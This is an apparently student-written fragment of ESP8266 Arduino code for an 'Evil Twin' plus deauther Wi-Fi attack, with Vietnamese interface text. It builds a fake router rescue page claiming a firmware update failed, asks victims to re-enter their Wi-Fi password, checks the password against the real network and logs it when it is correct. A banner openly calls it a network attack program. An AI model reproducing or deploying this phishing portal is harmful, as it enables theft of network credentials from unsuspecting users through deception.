...
//nguyen Nhat Huy 2180607567 21DTHE1
typedef struct
{
  String ssid;
  uint8_t ch;
...
#define SUBTITLE "CHẾ ĐỘ CỨU HỘ WIFI ROUTER"
#define TITLE "&#9888;Cập Nhật Firmware Thất Bại"
#define BODY "<h3>Router của bạn đã gặp sự cố khi tự động cài đặt bản cập nhật firmware mới nhất 2024</h3><br><h4>Để khôi phục lại Firmware cũ của Router,<br> Vui lòng Xác Minh Mật Khẩu của Bạn.</h4>"
...
String header(String t) {
  ...
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               ...
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size: 6vw;}"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border: 1px solid #d9d9d9; border-radius: 5px; }"
               "label { color: #333; display: block; font-weight: bold; }"
               "nav { background: #4285f4; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; }"
               "footer { background: #f1f1f1; color: #666; padding: 1em; text-align: center; font-size: 0.9em; }";
...
String footer() {
  String a = String(_selectedNetwork.ssid);
  return "</div><footer>&#169; " + a + " Bản Quyền. </footer></body></html>";
}

String index() {
  return header(TITLE) + "<div>" + BODY + "</div><div><form action='/' method='post'><label>Mật khẩu WiFi:</label>" +
         "<input type='password' id='password' name='password' minlength='8'></input><input type='submit' value='Tiếp tục'></form>" + footer();
}
...
void handleResult() {
  ...
  if (WiFi.status() != WL_CONNECTED) {
    ...
    _correct = "THANH CONG LAY ĐC PASSWIFI: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
...
String _tempHTML = "<html><head><meta charset='UTF-8'><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   ...
                   "<marquee bgcolor='blue' color='white'><h1> Tấn Công Evil-TwiN &nbsp;&nbsp; &#128163; &nbsp; &nbsp; Devil-TWin &nbsp; &nbsp; &#x2622; &nbsp; &nbsp; Deauther &nbsp; + &nbsp; Evil-Twin &nbsp;&nbsp; &#x2764; &nbsp; &nbsp; chương trình Tấn Công Mạng Bằng Các Mạch IOT &nbsp; &nbsp; &nbsp; &nbsp; </h1></marquee>"
                   "<center><h3>Chương trình sử dụng Devil-TWin<br>Deauther &nbsp; + &nbsp; Evil-Twin &nbsp;  = &nbsp; Devil-Twin<br>Chương Trình sử dụng Evil-TwiN . <br>### Được Thực Hiện Nhóm 4 người Nhật Huy, Vương, Xuân Bắc, Thái###</h3></center>"
